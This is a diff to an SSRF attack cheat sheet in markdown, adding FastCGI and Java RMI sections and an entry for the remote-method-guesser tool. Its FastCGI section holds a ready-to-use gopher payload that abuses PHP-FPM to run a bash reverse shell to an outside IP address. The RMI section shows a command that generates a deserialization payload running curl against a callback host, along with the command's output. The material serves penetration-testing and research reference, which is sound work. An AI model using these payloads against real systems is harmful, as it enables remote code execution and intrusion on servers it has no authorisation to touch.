@@ -99,10 +99,13 @@ The response times are slower or faster depending on whether or not the URL you 
 - [Redis](#redis)
 - [Memcache](#memcache)
 - [Apache Tomcat](#tomcat)
+- [FastCGI](#fastcgi)
+- [Java RMI](#java-rmi)
 
 **Tools**
 
 - [Gopherus](#gopherus)
+- [remote-method-guesser](#remote-method-guesser)
 - [SSRF Proxy](#ssrfproxy)
 
 ----------------------------------
@@ -760,6 +763,7 @@ CTF writeup using this technique:
 
 [From XXE to RCE: Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)
 
+
 <div id="fastcgi"></div>
 
 ## FastCGI
@@ -770,6 +774,26 @@ This was taken from [here](https://blog.chaitin.cn/gopher-attack-surfaces/).
 
 ```bash
 gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
+```
+
+<div id="java-rmi"></div>
+
+## Java RMI
+
+**Commonly bound ports: 1090,1098,1099,1199,4443-4446,8999-9010,9999**
+
+Blind *SSRF* vulnerabilities that allow arbitrary bytes (*gopher based*) can be used to perform deserialization or
+codebase attacks on the *Java RMI* default components (*RMI Registry*, *Distributed Garbage Collector*, *Activation System*).
+A detailed writeup can be found [here](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/). The following listing
+shows an example for the payload generation:
+
+```console
+$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
+[+] Creating ysoserial payload... done.
+[+]
+[+] Attempting deserialization attack on RMI Registry endpoint...
+[+]
+[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
 ```
 
 -------------------
@@ -792,6 +816,19 @@ This tool generates Gopher payloads for:
 - Zabbix
 - Memcache
 
+
+<div id="remote-method-guesser"></div>
+
+## remote-method-guesser
+
+- [remote-method-guesser - Github](https://github.com/qtc-de/remote-method-guesser)
+- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)
+
+*remote-method-guesser* is a *Java RMI* vulnerability scanner that supports attack operations for most common *Java RMI*
+vulnerabilities. Most of the available operations support the ``--ssrf`` option, to generate an *SSRF* payload for the
+requested operation. Together with the ``--gopher`` option, ready to use *gopher* payloads can be generated directly.
+
+
 <div id="ssrfproxy"></div>
 
 ## SSRF Proxy
@@ -812,3 +849,4 @@ Thank you to the following people that have contributed to this post:
 - [@vtnahira - OpenTSDB RCE](https://twitter.com/vtnahira)
 - [@fransrosen - SSRF canaries concept](https://twitter.com/fransrosen)
 - [@theabrahack - RCE via Jenkins Groovy](https://twitter.com/@theabrahack)
+- [@qtc_de - RCE via Java RMI](https://twitter.com/qtc_de)
